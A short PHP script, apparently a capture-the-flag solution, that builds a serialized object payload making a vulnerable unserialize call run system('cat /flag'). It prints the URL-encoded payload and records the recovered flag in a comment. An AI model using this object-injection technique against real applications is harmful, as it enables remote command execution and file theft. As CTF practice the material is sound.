<?php

class A{
    var $a;
    var $c;
}
class B{
    var  $b;
}

$a = new A();
$b = new B();
$a->a = $b;
$b->b = "system";
$a->c = "cat /flag";

echo urlencode(serialize($a));
// O%3A1%3A%22A%22%3A2%3A%7Bs%3A1%3A%22a%22%3BO%3A1%3A%22B%22%3A1%3A%7Bs%3A1%3A%22b%22%3Bs%3A6%3A%22system%22%3B%7Ds%3A1%3A%22c%22%3Bs%3A9%3A%22cat+%2Fflag%22%3B%7D
// flag{hell0_every0ne}
?>